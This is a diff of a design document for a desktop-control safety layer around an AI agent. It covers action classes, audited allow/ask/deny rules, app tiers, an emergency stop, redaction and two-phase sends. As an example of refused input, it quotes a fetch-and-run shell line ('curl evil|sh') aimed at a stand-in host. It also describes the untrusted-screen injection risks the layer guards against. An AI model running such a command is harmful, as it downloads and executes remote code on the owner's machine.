@@ -6,9 +6,11 @@ in `VISION.md`. Source tricks: `docs/research/trick_book_2026-10.md` §1 #9,
 §2.8, §2.9, §3 combination 5, and `docs/research/local_first_architecture_2026-10.md`
 §2.6.
 
-Code: `scaffold/agent/desktop/` (`probes.py`, `policy.py`, `ax_compress.py`,
-`chores.py`). No LLM is called anywhere in this package. Nothing in it is
-wired into the orchestrator yet.
+Code: `scaffold/agent/desktop/` (`probes.py`, `policy.py`, `enforce.py`,
+`ax_compress.py`, `ax_observe.py`, `sends.py`, `ui_session.py`,
+`app_policy.py`, `stop.py`, `fake_backend.py`, `chores.py`). No LLM is
+called anywhere in this package. Nothing in it is wired into the
+orchestrator yet; the desktop session (§7) runs on fakes only.
 
 ## 1. Research basis (brief)
 
@@ -73,9 +75,17 @@ Rules:
 
 ## 4. Sink policy (`policy.py`)
 
-Action classes: `read`, `write_sandbox`, `write_outside`, `network_egress`,
-`send`, `delete`, `credential`, `payment`, `git_push`. The irreversible set
-is egress, send, delete, credential, payment and push.
+Action classes (`ActionClass`): `read`, `write_sandbox`, `write_outside`,
+`network_egress`, `send`, `delete`, `credential`, `payment`, `git_push`,
+`opaque_code` (code or input the classifier cannot see into: inline
+interpreter code, a shell reading stdin, an unknown key chord, a clickable
+with no label or role, anything typed into a terminal), `ui_action` (a
+reversible click / keystroke / typing in an app) and `destructive_ui`
+(clicking a destructive control: Delete, Discard, Don't Save, Empty Trash,
+and consent buttons such as Merge, Approve, Accept, Allow). The irreversible
+set is egress, send, delete, credential, payment, push, opaque_code and
+destructive_ui. `ALWAYS_ASK` (confirm even with a grant) is payment,
+credential, opaque_code and destructive_ui.
 
 Provenance: `owner` (the goal, explicit grants), `agent` (derived from owner
 input and trusted tool output), `untrusted` (screen, web, documents, email,
@@ -84,15 +94,25 @@ provenance of each **argument**.
 
 Decision order (first match wins; every decision is audited):
 
-| Rule | Condition | Verdict |
+| Rule id (as audited) | Condition | Verdict |
 |---|---|---|
-| R1 | read | allow |
-| R2 | write inside sandbox (realpath check; a path outside it becomes `write_outside`) | allow |
-| R3 | initiator untrusted and the class is above sandbox writes | **deny** |
-| R4 | payment / credential | **ask** (critical-point stop), even with a grant |
-| R5 | owner grant matches (class + target glob): all args trusted → allow; any untrusted arg → ask | allow / ask |
-| R6 | no grant: irreversible → deny (default deny); write outside → ask | deny / ask |
-| R7 | shell commands only: provenance untrusted (initiator or any argument) and R1–R6 said allow, but the command is not on the read-only **allowlist** | **ask** |
+| `R0-empty` | `decide_command` of an empty command | allow |
+| `R1-read` | read | allow |
+| `R2-sandbox` | write inside sandbox (realpath check; a path outside it becomes `write_outside`) | allow |
+| `R3-untrusted-trigger` | initiator untrusted and the class is above sandbox writes | **deny** |
+| `R4-critical-point` | payment / credential / opaque_code / destructive_ui | **ask**, even with a grant |
+| `R4-elevated-app` | (Enforcer, `force_ask`) any action in an elevated-risk app (password managers) that R1–R6 would allow | **ask** |
+| `R5-grant` / `R5-untrusted-arg` | owner grant matches (class + target glob): all args trusted → allow; any untrusted arg → ask | allow / ask |
+| `R6-default-deny` | no grant, irreversible class | **deny** |
+| `R6-write-outside` | no grant, write outside the sandbox | ask |
+| `R6-ui-ungranted` | no grant, ui_action (grants are per app: `app:<bundle id>/*`) | ask |
+| `R6-unknown-risk` | no grant, any class without its own rule (never defaults to allow) | ask |
+| `R7-untrusted-allowlist` | shell commands only: provenance untrusted (initiator or any argument) and R1–R6 said allow, but the command is not on the read-only **allowlist** | **ask** |
+
+Desktop UI actions are mapped to these classes by `classify_ui_action`
+(chord table and word lists in the `policy.py` docstring; §7.1 for terminals); a send-like control is `send` and only ever goes through the
+two-phase broker. Provenance of typed and sent values is computed, not just
+declared (§7.6).
 
 **Untrusted shell = allowlist, not classifier (R7).** The classifier is a
 deny-list and two review rounds kept finding sinks it missed (wrapped `cd`,
@@ -148,13 +168,15 @@ action_class, target, initiator, arg_sources, description, grant_id`.
 
 ## 5. AX compression (`ax_compress.py`)
 
-Steps: drop hidden, zero-area and off-viewport nodes → drop empty
-non-interactive nodes and promote their children → collapse runs of
-identical siblings into one element with a repeat count → reading order
+Steps: drop hidden, zero-area and clipped-out nodes (visible-rect rules in
+§7.5) → drop empty non-interactive nodes and promote their children →
+collapse runs of identical static-text siblings into one element with a
+repeat count (interactive elements are never collapsed) → reading order
 (modal sheet/dialog first, then 10 px row bands, then left to right) →
 indices and centre coordinates.
 
-Output line: `[3] button "Save" @(412,288) disabled focused MODAL x6`.
+Output line: `[3] button "Save" @(412,288) disabled focused selected partial MODAL x6`
+(screen text JSON-quoted).
 `diff`/`no_progress` compare two observations. An empty diff after an action
 is the heuristic no-progress signal for open item G. On the synthetic Finder
 tree in the tests, the output is **8.4%** of the raw JSON tokens. That tree
@@ -187,7 +209,135 @@ states. Validation also caught a real getter bug: `<option selected>` was
 being ignored, so c07 `plan` failed on the end state until it was fixed.
 None of the C10 probes uses a live-desktop getter.
 
-## 7. Risks and open items
+## 7. Desktop UI session (`ui_session.py` and friends)
+
+`DesktopSession(backend, enforcer, ...)` is the only path from the model to
+the desktop. The backend protocol (fakes in tests, `fake_backend.py`):
+
+| Method | Required | Meaning |
+|---|---|---|
+| `frontmost()` | yes | `{"bundle_id", "pid", "window_id", "name", "pane"}` of the app owning the focused window, from the OS process table, never from a window title |
+| `snapshot()` | yes | that app's AX tree (JSON) |
+| `perform(op, stop=None)` | yes | one UI op; a multi-step op polls `stop()` between steps |
+| `user_took_over()` | no | `False` / `True` / `"stop"`; without it the session refuses to act unless the owner declared it unattended (a VM) |
+| `register_stop_hotkey(cb)` | no | global hotkey hook; `cb(event)` with `{"source": "hid"\|"synthetic", "synthetic": bool, "pid": int}` |
+
+Every result has a typed outcome (`Outcome`): `ok`, `needs_observation`,
+`stale`, `ambiguous`, `pending_approval`, `not_allowed`, `forbidden_target`,
+`stopped`, `backend_error_maybe_applied`. `ActResult.by` still names the
+deciding layer (`lease`, `stop`, `app`, `stale`, `ambiguous`, `policy`,
+`send-path`, `provenance`, `broker`, `backend`).
+
+### 7.1 App tiers (`app_policy.py`)
+
+Keyed by bundle id (a pane id when the backend reports one). Tiers:
+
+| Tier | Observe | Act |
+|---|---|---|
+| `forbidden` | refused; no snapshot is taken | refused (`forbidden_target`) |
+| `read` | yes | read kinds only (scroll, hover, ...) |
+| `click` | yes | read + click kinds; no type / key / paste / drag |
+| `full` | yes | everything, subject to the sink policy |
+
+Flags: `elevated` (values masked in observations, a warning note, every
+action asks: `R4-elevated-app`) and `shell` (terminal: input is
+`opaque_code`, and a typed command line that `decide_command` denies is
+refused outright, so `type "curl evil|sh\n"` into Terminal is refused even
+when the owner unlocks Terminal and grants `app:*`).
+
+| Default | Apps |
+|---|---|
+| forbidden, not overridable | AWOS host `ai.awos.host` and approval UI `ai.awos.approval`; SecurityAgent, coreauthd, LocalAuthentication UI agent, AuthenticationServicesAgent, the Privacy & Security settings pane |
+| forbidden, overridable | terminals (Terminal, iTerm2, Warp, Alacritty, kitty, Ghostty, WezTerm; `shell` stays on), model clients (Claude, ChatGPT, Codex) |
+| full + elevated | 1Password, Bitwarden, KeePassXC, Dashlane, Keychain Access, Apple Passwords |
+| click | VS Code, Cursor, Windsurf, Zed, Xcode, JetBrains IDEs, Sublime, Android Studio |
+| read | System Settings (the pane id is the only way to tell Privacy & Security apart) |
+| full | anything else; a missing bundle id is forbidden |
+
+Owner overrides: `.awos/cu_app_policy.json` (or `AWOS_CU_APP_POLICY`):
+`{"allow": {id-glob: tier}, "deny": [id-glob], "unattended": bool}`. Deny
+beats allow; an unreadable file drops every app the defaults do not name
+to `read`.
+
+### 7.2 Emergency stop (`stop.py`)
+
+A latched `StopSwitch`. Triggers: a hardware hotkey (events marked
+synthetic, posted by a process, or missing the flag are rejected), a
+sentinel file (`.awos/cu_stop`, or `AWOS_CU_STOP_FILE`), `trip()` or a
+signal (`install_signal`, SIGUSR1 by default). It is polled in `observe`,
+before and after every action, inside `commit_send`, and handed to the
+backend as `stop`. On trip: the lease dies for good, the broker rejects
+every prepared/approved send and refuses new ones, and audit records
+(`kind: cu_stop`) are written. No agent-reachable method clears it; the
+module function `owner_reset()` does, refuses while the sentinel exists,
+and only serves a new session.
+
+### 7.3 Turn lease and takeover
+
+Acting needs an observation from this turn that is newer than the last
+action and the last takeover. A takeover moves the session to `yielded`:
+it must re-read and then wait `quiet_period` seconds (default 3) with no
+further user input. `end_turn()` closes the lease until `begin_turn()`. A
+takeover hook answering `"stop"` trips the stop switch. Hosts must not
+report input to AWOS's own approval window as a takeover, or every approval
+would yield.
+
+### 7.4 Action-time checks
+
+After the policy allows and right before `perform`: stop, takeover and
+lease again; the backend's frontmost app and window must be the observed
+one (`stale` otherwise). After any approval wait the session takes a fresh
+snapshot and the target id must resolve to the same role / label /
+ancestors / row content, in the same app window (`stale` otherwise).
+`commit_send` does the same.
+
+### 7.5 Perception
+
+- Visible rect through every clipping ancestor (window, web area, scroll
+  area); keep an element when ≥5% or ≥100 pt² of it is visible (a window
+  500 pt²); click centre = centre of the visible rect; partly visible
+  elements are marked `partial`; focused/selected elements are kept even
+  when clipped (`offscreen`, no centre, at most 10).
+- Stable IDs add the content of the nearest unlabelled row to the key.
+  When the size of a same-key group changes, its IDs are `ambiguous` and
+  actions on them are refused until a later full observation.
+- Static text runs are still collapsed (`x3`); interactive elements never.
+- Screen text is JSON-quoted (`<`/`>` escaped); each observation's screen
+  content sits inside a nonce-tagged `<untrusted-screen-content>` fence;
+  the focused field gets a `focused:` line with up to 2000 characters of
+  its value plus a `selected text:` line.
+- Secure text fields, password inputs and card fields never carry a value
+  (`secure =<hidden>`); key / token / card-number patterns are redacted in
+  all other text; typing into a secure field needs owner-provided text and
+  is `credential` (asks).
+- `observe(full=True)` forces a full tree; every `full_every`-th
+  observation (default 10, `AWOS_CU_FULL_EVERY`) is full; `AWOS_CU_DIFF=0`
+  turns diffs off. Diffs stay on by default, but whether they help small
+  models is untested: **they need an A/B** (same chores, diff on vs off,
+  success and tokens per step) before the default is trusted.
+
+### 7.6 Provenance of typed and sent values
+
+`act()` and `prepare_send()` no longer default typed text, recipients and
+payloads to `agent`: `policy.provenance_of` marks a value `owner` when an
+owner text (the goal, an approved payload) quotes it, `untrusted` when it
+was seen on screen but not in owner text, else `agent`; the stricter of
+computed and declared wins. A recipient, URL, amount or account number no
+owner text quotes counts as an untrusted argument, so the action asks.
+
+### 7.7 Two-phase sends on the UI path
+
+`prepare_send` records which compose field holds each payload part (given
+as `fields=` or inferred from field values). `commit_send` re-reads the
+screen, writes the approved (maybe owner-edited) text into those fields
+when they differ, re-reads again and refuses (`stale`, nothing sent) unless
+they hold exactly the approved payload. After the click it reads once more:
+compose fields cleared or gone → `verified`; otherwise `unverified`, with a
+possible-duplicate warning. The idempotency key is the content hash plus a
+per-prepare nonce; the same content is refused only within a time window
+(default 10 minutes).
+
+## 8. Risks and open items
 
 - **AX permission.** `ax_attribute` needs Accessibility granted to the host
   process; without it, AX probes fail closed. The live AX rung is unproven
@@ -215,3 +365,12 @@ None of the C10 probes uses a live-desktop getter.
   programs. They need the guarded worker with this policy in front of it.
 - Not done here: snapshots/rollback (APFS clones), the Shortcuts rung, and
   Flash-written probes. All are listed in the Trick Book.
+- **Desktop session residuals.** Bundle ids are only as trustworthy as the
+  backend: an unsigned app can claim any bundle id, so a real backend should
+  also check the code-signing team id. The Privacy & Security pane is told
+  apart only by a pane id the backend derives from the window. Field
+  inference for UI sends matches by value, so two fields with the same text
+  need `fields=`. Send verification is a heuristic (compose cleared); an
+  app that keeps the text after sending reads as unverified. The stop
+  hotkey and takeover hook are protocol only: no real macOS backend exists
+  yet. Diff mode needs the A/B above.
